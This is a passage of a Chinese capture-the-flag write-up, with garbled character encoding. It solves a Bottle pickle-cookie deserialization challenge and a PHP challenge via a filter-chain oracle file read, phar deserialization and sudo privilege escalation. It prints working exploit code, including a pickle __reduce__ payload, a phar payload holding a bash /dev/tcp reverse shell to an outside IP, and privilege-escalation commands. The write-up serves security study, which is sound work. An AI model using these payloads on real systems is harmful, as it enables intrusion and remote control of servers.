</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">config.D0g3_GC</span> <span class="kn">import</span> <span class="n">Mountain</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">messages</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/hello&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_cookie</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">Mountain</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span> <span class="ow">or</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;guest&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">session</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;guest&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">Mountain</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;guest&#34;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;hacker!!! I&#39;ve caught you&#34;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/display&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">def</span> <span class="nf">get_image</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="n">photo</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;photo&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="k">if</span> <span class="n">photo</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s1">&#39;display&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;^../|environ|self&#34;</span><span class="p">,</span> <span class="n">photo</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Hacker!!! I&#39;ll catch you no matter what you do!!!&#34;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="n">requested_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="s2">&#34;picture&#34;</span><span class="p">,</span> <span class="n">photo</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="k">if</span> <span class="n">photo</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.png&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">            <span class="n">default_png_path</span> <span class="o">=</span> <span class="s2">&#34;/appppp/picture/&#34;</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">            <span class="n">pngrequested_path</span> <span class="o">=</span> <span class="n">default_png_path</span><span class="o">+</span><span class="n">photo</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pngrequested_path</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="n">tfile</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">content_type</span> <span class="o">=</span> <span class="s1">&#39;image/png&#39;</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">requested_path</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">                <span class="n">tfile</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;you have some errors, continue to try again&#34;</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="k">return</span> <span class="n">tfile</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">
</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">    <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_cookie</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">Mountain</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">        <span class="k">return</span> <span class="n">template</span><span class="p">(</span><span class="s2">&#34;administator&#34;</span><span class="p">,</span> <span class="n">messages</span><span class="o">=</span><span class="n">messages</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;No permission!!!!&#34;</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">
</span></span><span class="line"><span class="ln">61</span><span class="cl">
</span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">    <span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8089</span><span class="p">)</span>
</span></span></code></pre></div><p>è¿™é‡Œæ˜¯å¯¼å…¥çš„æ˜¯æ„é€ cookieçš„key</p>
<pre tabindex="0"><code>from config.D0g3_GC import Mountain
</code></pre><p>keyå¯ä»¥é€šè¿‡ä»»æ„æ–‡ä»¶è¯»å–è¯»åˆ°</p>
<p>/appppp/config/D0g3_GC.py</p>
<p><img alt="image-20241226141149265" loading="lazy" src="../assets/image-20241226141149265.png"></p>
<p>é€šè¿‡ä»£ç æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå“ªæ€•æˆ‘ä»¬æ„é€ å‡ºadminè¿›å…¥åˆ°/adminè·¯ç”±é‚£æˆ‘ä»¬å…¶å®ä¹Ÿä¸èƒ½å¾—åˆ°ä»€ä¹ˆ</p>
<p>äº‹å®ä¸Šè¿™æ˜¯ä¸€é“pickleååºåˆ—åŒ–çš„é¢˜ç›®</p>
<p><img alt="image-20241227140511395" loading="lazy" src="../assets/image-20241227140511395.png"></p>
<p><img alt="image-20241227140534142" loading="lazy" src="../assets/image-20241227140534142.png"></p>
<p>æˆ‘ä»¬å¦‚æœè·Ÿè¿›get_cookieæ–¹æ³•(/adminå’Œ/helloéƒ½æœ‰)æˆ‘ä»¬å¯ä»¥å‘ç°</p>
<p><img alt="image-20241221223707318" loading="lazy" src="../assets/image-20241221223707318.png"></p>
<p>åœ¨è¿™ä¸ªget_cookieæ–¹æ³•é‡Œé¢ä¼šå¯¹cookieä¸­çš„æ•°æ®è¿›è¡Œpickleååºåˆ—åŒ–</p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»–å°±å¯ä»¥è¿›è¡Œä»»ä½•å‘½ä»¤çš„æ‰§è¡Œ</p>
<p>exp</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span><span class="n">response</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Mountain</span> <span class="o">=</span> <span class="s2">&#34;123&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).popen(&#39;calc&#39;).read()&#34;</span><span class="p">,))</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">session</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;name&#34;</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">Mountain</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;success&#34;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">chdir</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8081</span><span class="p">)</span>
</span></span></code></pre></div><p>å¼¹shellæ‹¿flag</p>
<p><img alt="image-20241227140022898" loading="lazy" src="../assets/image-20241227140022898.png"></p>
<h4 id="å›¾ç‰‡æŸ¥çœ‹å™¨">å›¾ç‰‡æŸ¥çœ‹å™¨<a hidden class="anchor" aria-hidden="true" href="#å›¾ç‰‡æŸ¥çœ‹å™¨">#</a></h4>
<blockquote>
<p>è€ƒç‚¹ï¼š1.ä¿¡æ¯æ”¶é›† 2.filterchainè¯»æ–‡ä»¶ 3.pharååºåˆ—åŒ– 4.ææƒ</p></blockquote>
<p><img alt="image-20241229120235391" loading="lazy" src="../assets/image-20241229120235391.png"></p>
<p>æ‹¿åˆ°é¢˜ç›®æ˜¯ä¸€ä¸ªåå­—è¾“å…¥å™¨ï¼Œä½†è¿™ç©æ„æ²¡ä»€ä¹ˆç”¨</p>
<p>éšä¾¿è¾“ä¸€ä¸ªåå­—å°±ä¼šè¿›å…¥åˆ°/trans1t.php</p>
<p><img alt="image-20241229120412660" loading="lazy" src="../assets/image-20241229120412660.png"></p>
<p>æˆ‘ä»¬å…ˆä¸æ€¥ç€å»æŒ‘æˆ˜ï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªé¡µé¢æœ‰æ²¡æœ‰ä»€ä¹ˆhint</p>
<p><img alt="image-20241229120524495" loading="lazy" src="../assets/image-20241229120524495.png"></p>
<p>æç¤ºæœ‰ä¸œè¥¿åœ¨hI3t.php,ä½†æ˜¯æˆ‘ä»¬æ²¡åŠæ³•ç›´æ¥è®¿é—®</p>
<p>æ¥ç€ç‚¹æ¥åˆ°æŒ‘æˆ˜æ¥åˆ°/chal13nge.php</p>
<p><img alt="image-20241229120615315" loading="lazy" src="../assets/image-20241229120615315.png"></p>
<p>æ˜¯ä¸€ä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œæˆ‘ä»¬å†æŸ¥çœ‹ä¸€ä¸‹æºä»£ç </p>
<p><img alt="image-20241229120711021" loading="lazy" src="../assets/image-20241229120711021.png"></p>
<p>ç»“åˆåˆšåˆšçœ‹åˆ°çš„hI3t.phpï¼ŒçŒœæµ‹å¤§æ¦‚ç‡æ˜¯è¦æƒ³åŠæ³•è¯»hI3t.php</p>
<p>å†çœ‹çœ‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œå†ä¸Šä¼ æˆåŠŸåå¯ä»¥è¿›è¡Œæ–‡ä»¶ä¿¡æ¯çš„æŸ¥è¯¢ï¼Œæ–‡ä»¶ä¿¡æ¯æŸ¥è¯¢ä½¿ç”¨çš„æ–¹æ³•å¾ˆå¯èƒ½å­˜åœ¨filteré“¾çš„æ¼æ´</p>
<p>è¿™é‡Œæ˜¯å…³äºoracleçš„æ–‡ä»¶è¯»å–æ¼æ´</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/12939?time__1311=GqGxuD9Qi%3Dn4lrzG7Dy7FD8RAg4xYubPpD">PHP Filteré“¾â€”â€”åŸºäºoracleçš„æ–‡ä»¶è¯»å–æ”»å‡» - å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>è‡ªåŠ¨åŒ–å·¥å…·ï¼šhttps://github.com/synacktiv/php_filter_chains_oracle_exploit</p></blockquote>
<pre tabindex="0"><code>python filters_chain_oracle_exploit.py --target http://125.70.243.22:31345/chal13nge.php --file &#39;/var/www/html/hI3t.php&#39; --parameter image_path

//--target ç›®æ ‡åœ°å€ --file è¦è¯»çš„æ–‡ä»¶åœ°å€ --parameter è¦æ³¨å…¥çš„å‚æ•°
</code></pre><p><img alt="image-20241229125206299" loading="lazy" src="../assets/image-20241229125206299.png">'</p>
<p>è®¿é—®/x@1.php</p>
<p><img alt="image-20241229125333392" loading="lazy" src="../assets/image-20241229125333392.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåé—¨ç±»backdoorï¼Œé€šè¿‡å®ƒæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„çš„å‘½ä»¤</p>
<p>é‚£æˆ‘ä»¬æ€ä¹ˆè°ƒç”¨è¿™ä¸ªåé—¨ç±»å‘¢ï¼Ÿ</p>
<p>ç»“åˆåˆšåˆšçš„æ–‡ä»¶ä¸Šä¼ å’Œæ–‡ä»¶ä¿¡æ¯æŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°pharååºåˆ—åŒ–</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">class</span> <span class="nc">backdoor</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"> 
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">backdoor</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="o">=</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/106.55.168.231/7777 0&gt;&amp;1&#34;&#39;</span><span class="p">;</span> <span class="c1">//å¼¹ä¸ªshell
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;test.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;test&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</span></span></code></pre></div><p>æ¥ç€æˆ‘ä»¬å¯é€šè¿‡æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€çš„æ–¹æ³•ä¸Šä¼ æˆ‘ä»¬çš„pharæ–‡ä»¶</p>
<p><img alt="image-20241229130253696" loading="lazy" src="../assets/image-20241229130253696.png"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>æˆ‘ä»¬æ¥ç€è¯»pharæ–‡ä»¶</p>
<p><img alt="image-20241229130529673" loading="lazy" src="../assets/image-20241229130529673.png"></p>
<p><img alt="image-20241229131312566" loading="lazy" src="../assets/image-20241229131312566.png"></p>
<p>æˆåŠŸå¼¹shell</p>
<p><img alt="image-20241229131353434" loading="lazy" src="../assets/image-20241229131353434.png"></p>
<p>å°è¯•è¯»flagå‘ç°è¦ææƒ</p>
<p>é€šè¿‡ <strong>sudo -l</strong> å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªcheck.shæ–‡ä»¶å…·æœ‰sudoæƒé™</p>
<p><img alt="image-20241229132017835" loading="lazy" src="../assets/image-20241229132017835.png"></p>
<p>æ‰§è¡Œcheck.shä¼šè¿è¡Œrun.sh</p>
<p><img alt="image-20241229132223194" loading="lazy" src="../assets/image-20241229132223194.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡å†™ä¸€ä¸ªrun.shæ¥è¯»flag</p>
<pre tabindex="0"><code>echo &#34;cat /root/flag&#34; &gt; /tmp/rootscripts/run.sh
chmod 777 /tmp/rootscripts/run.sh
sudo /tmp/rootscripts/check.sh &#34;/tmp/rootscripts&#34;
</code></pre><p><img alt="image-20241229132815538" loading="lazy" src="../assets/image-20241229132815538.png"></p>
<p>æ‹¿åˆ°flag</p>
<p>é¢˜å¤–</p>
<p>/chal13nge.phpçš„æºç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">include</span> <span class="s2">&#34;class.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;image_path&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nv">$image_path</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;image_path&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;The owner ID of the file is: &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">echo</span> <span class="nx">fileowner</span><span class="p">(</span><span class="nv">$image_path</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;æ–‡ä»¶ä¿¡æ¯å¦‚ä¸‹ï¼š&#34;</span><span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$m</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$image_path</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$m</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;å®½åº¦: &#34;</span> <span class="o">.</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; åƒç´ &lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;é«˜åº¦: &#34;</span> <span class="o">.</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34; åƒç´ &lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;ç±»å‹: &#34;</span> <span class="o">.</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;HTML å±æ€§: &#34;</span> <span class="o">.</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;MIME ç±»å‹: &#34;</span> <span class="o">.</span> <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;æ— æ³•è·å–å›¾åƒä¿¡æ¯ï¼Œè¯·ç¡®ä¿æ–‡ä»¶ä¸ºæœ‰æ•ˆçš„å›¾åƒæ ¼å¼ã€‚&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="nv">$allowed_extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;jpeg&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="nv">$upload_dir</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/uploads/&#39;</span><span class="p">;</span>
